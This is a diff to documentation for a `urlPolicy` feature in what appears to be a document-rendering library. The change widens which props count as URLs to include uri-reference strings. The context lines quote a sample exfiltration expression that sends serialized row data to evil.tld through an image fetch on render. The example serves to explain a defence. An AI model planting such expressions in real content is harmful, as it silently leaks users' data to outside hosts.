@@ -250,8 +250,9 @@ a longer one is rejected before parsing. Pass the same value to
 
 ### `urlPolicy` — the URLs a document may load
 
-`urlPolicy` checks every prop the definition declares as a URL (`z.url(){:ts}`),
-after props parse and before the implementation sees them. The
+`urlPolicy` checks every prop the definition declares as a URL
+(`z.string().meta({ format: "uri-reference" }){:ts}`), after props parse and before the implementation sees
+them. `z.url(){:ts}` declares one too, but it accepts only absolute URLs. The
 [evaluator](/expr) allows
 `"https://evil.tld/?d=" + JSON.stringify(scopes.root.rows){:ts}`, a valid
 expression, and `<img src>` fetches it on render, with no click.
